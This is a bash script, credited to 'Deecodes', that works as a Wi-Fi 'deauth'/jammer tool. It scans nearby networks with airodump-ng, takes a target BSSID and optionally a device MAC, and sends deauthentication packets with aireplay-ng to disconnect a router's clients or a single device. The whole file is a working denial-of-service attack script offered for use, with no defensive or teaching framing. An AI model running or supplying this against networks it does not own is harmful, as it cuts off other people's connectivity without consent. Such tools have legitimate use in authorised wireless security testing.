#!/bin/bash
clear
if [ $UID -ne 0 ]; then
echo "Please Run The Script With Root User" | lolcat
fi

START=`date +%s`
neofetch
echo author: Deecodes | sudo lolcat
echo "What do you want to deauth...??"
echo "1) Router"
echo "2) Device"
read option
if [ "$option" == "1" ]; then

echo "First copy the target (bssid) by this command" "(sudo airodump wlan1)" | lolcat
echo "Did you copied..!!!!" "(y/n)"
read response

if [ "$response" == "y" ]; then
clear

elif [ "$response" == "n" ]; then
read -p "Enter a network interface name :" interface
echo "Searching Targets..." | lolcat
sleep 2
sudo timeout 20 airodump-ng $interface
echo "Here the targets...please select the bssid" | lolcat
fi

# Targer bssid
read -p  "Enter the target bssid : " bssid

#Your wirless interface (wifi adaptor name)
read -p  "Enter the Network Interface : " interface

#Packets for Deauth (Disconnect)
read -p "Enter the number of packets (Recommended - 100) : " packets

sudo aireplay-ng --deauth $packets -a $bssid $interface

# For device jammer
elif [ "$option" == "2" ]; then

echo "First copy the target (bssid) by this command" "(sudo airodump wlan1)" | lolcat
echo "Did you copied..!!!!" "(y/n)"
read response

if [ "$response" == "y" ]; then
clear

elif [ "$response" == "n" ]; then
read -p "Enter a network interface name :" interface
echo "Searching Targets..." | lolcat
sleep 2
sudo timeout 20 airodump-ng $interface
echo "Here the targets...please select the bssid" | lolcat
fi

# Target bssid
read -p "Enter the target bssid : " bssid

# Packets for Deauth (Disconnect)
read -p "Enter the number of packets (Recommended - 100) : " packets

# Your wirless interface (Wifi adapotor name)
read -p "Enter the network Interace : " interface

# Target Mac address
read -p "Enter the target MAC (station) : " mac

sudo aireplay-ng --deauth $packets -a $bssid -c $mac $interface

fi

# Timer
END=`date +%s`
TIME_TAKEN=$((END-START))
echo Time Taken  : $TIME_TAKEN seconds | lolcat
